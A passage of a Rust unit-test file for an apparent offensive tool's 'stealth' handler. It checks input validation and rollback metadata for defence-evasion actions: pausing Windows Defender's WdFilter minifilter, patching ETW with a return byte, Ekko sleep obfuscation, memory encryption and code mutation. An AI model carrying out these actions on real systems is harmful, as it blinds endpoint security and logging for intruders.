    fn sleep_ekko_requires_size_after_address() {
        let error = handle_stealth(&json!({"action": "sleep_ekko", "address": 4096}))
            .expect_err("sleep_ekko should require size");

        assert!(error.contains("stealth(action='sleep_ekko')"));
        assert!(error.contains("size"));
    }

    #[test]
    fn mutate_code_rejects_zero_size() {
        let error = handle_stealth(&json!({"action": "mutate_code", "address": 4096, "size": 0}))
            .expect_err("zero size should fail before memory protection changes");

        assert!(error.contains("stealth(action='mutate_code')"));
        assert!(error.contains("size"));
    }

    #[test]
    fn mutate_code_rejects_oversized_region_from_registry_bounds() {
        let error = handle_stealth(&json!({
            "action": "mutate_code",
            "address": 4096,
            "size": 0x10001
        }))
        .expect_err("oversized region should fail before memory protection changes");

        assert!(error.contains("stealth(action='mutate_code')"));
        assert!(error.contains("size"));
        assert!(error.contains("maximum 65536"));
    }

    #[test]
    fn mutate_code_rejects_oversized_intensity_from_registry_bounds() {
        let error = handle_stealth(&json!({
            "action": "mutate_code",
            "address": 4096,
            "size": 4096,
            "intensity": 4
        }))
        .expect_err("oversized intensity should fail before memory protection changes");

        assert!(error.contains("stealth(action='mutate_code')"));
        assert!(error.contains("intensity"));
        assert!(error.contains("<= 3"));
    }

    #[test]
    fn stealth_success_results_receive_provenance_and_memory_rollback() {
        let result = attach_stealth_metadata(
            &json!({
                "action": "encrypt_memory",
                "address": 4096,
                "size": 32,
                "request_id": "req-stealth",
                "task_id": "task-stealth",
                "chain_id": "chain-stealth",
                "purpose": "test stealth metadata"
            }),
            "encrypt_memory",
            json!({
                "success": true,
                "technique": "region_encryption",
                "address": "0x0000000000001000",
                "size": 32
            }),
        );

        assert_eq!(result["provenance"]["correlation_id"], "req-stealth");
        assert_eq!(result["provenance"]["request_id"], "req-stealth");
        assert_eq!(result["provenance"]["task_id"], "task-stealth");
        assert_eq!(result["provenance"]["chain_id"], "chain-stealth");
        assert_eq!(result["provenance"]["purpose"], "test stealth metadata");
        assert_eq!(result["mutation"]["kind"], "stealth_live_mutation");
        assert_eq!(
            result["mutation"]["state_change"],
            "local_memory_encryption_state"
        );
        assert_eq!(result["rollback"]["available"], true);
        assert_eq!(result["rollback"]["strategy"], "decrypt_local_region");
        assert_eq!(result["rollback"]["action"]["tool"], "stealth");
        assert_eq!(result["rollback"]["action"]["action"], "decrypt_memory");
        assert_eq!(
            result["rollback"]["action"]["args"]["address"],
            "0x0000000000001000"
        );
    }

    #[test]
    fn minifilter_pause_result_gets_resume_rollback() {
        let result = attach_stealth_metadata(
            &json!({
                "action": "minifilter_pause",
                "name": "WdFilter",
                "request_id": "req-filter"
            }),
            "minifilter_pause",
            json!({
                "success": true,
                "name": "WdFilter",
                "altitude": "328010",
                "detached_volumes": ["C:"],
                "recovery": {
                    "action": "minifilter_resume",
                    "name": "WdFilter",
                    "altitude": "328010",
                    "volumes": ["C:"]
                }
            }),
        );

        assert_eq!(
            result["mutation"]["state_change"],
            "minifilter_attachment_state"
        );
        assert_eq!(result["rollback"]["available"], true);
        assert_eq!(result["rollback"]["strategy"], "resume_minifilter");
        assert_eq!(result["rollback"]["action"]["action"], "minifilter_resume");
        assert_eq!(result["rollback"]["action"]["args"]["name"], "WdFilter");
        assert_eq!(result["rollback"]["action"]["args"]["altitude"], "328010");
        assert_eq!(result["rollback"]["action"]["args"]["volumes"][0], "C:");
    }

    #[test]
    fn stealth_original_bytes_result_gets_partial_restore_rollback() {
        let result = attach_stealth_metadata(
            &json!({"action": "patch_etw", "request_id": "req-etw"}),
            "patch_etw",
            json!({
                "success": true,
                "address": "0x0000000000002000",
                "original_bytes": [1, 2, 3, 4],
                "patch_bytes": [195]
            }),
        );

        assert_eq!(result["rollback"]["available"], "partial");
        assert_eq!(result["rollback"]["strategy"], "restore_original_bytes");
        assert_eq!(result["rollback"]["source_action"], "patch_etw");
        assert_eq!(result["rollback"]["action"]["tool"], "hook");
        assert_eq!(result["rollback"]["action"]["action"], "restore");
        assert_eq!(result["rollback"]["action"]["args"]["original_bytes"][0], 1);
    }

    #[test]
    fn stealth_read_only_result_keeps_provenance_without_mutation() {
        let result = attach_stealth_metadata(
            &json!({"action": "defender_status", "request_id": "req-status"}),
            "defender_status",
            json!({"success": true, "status": "unknown"}),
        );

        assert_eq!(result["provenance"]["request_id"], "req-status");
        assert!(result.get("mutation").is_none());
        assert!(result.get("rollback").is_none());
    }

    #[test]
    fn stealth_success_preserves_handler_supplied_metadata() {
        let result = attach_stealth_metadata(
            &json!({"action": "sentinel_start", "request_id": "req-wrapper"}),
            "sentinel_start",
            json!({
                "success": true,
                "provenance": {"request_id": "req-handler"},
                "mutation": {"kind": "handler_mutation"},
                "rollback": {"available": "handler"}
            }),
        );

        assert_eq!(result["provenance"]["request_id"], "req-handler");
        assert_eq!(result["mutation"]["kind"], "handler_mutation");
        assert_eq!(result["rollback"]["available"], "handler");
    }
}
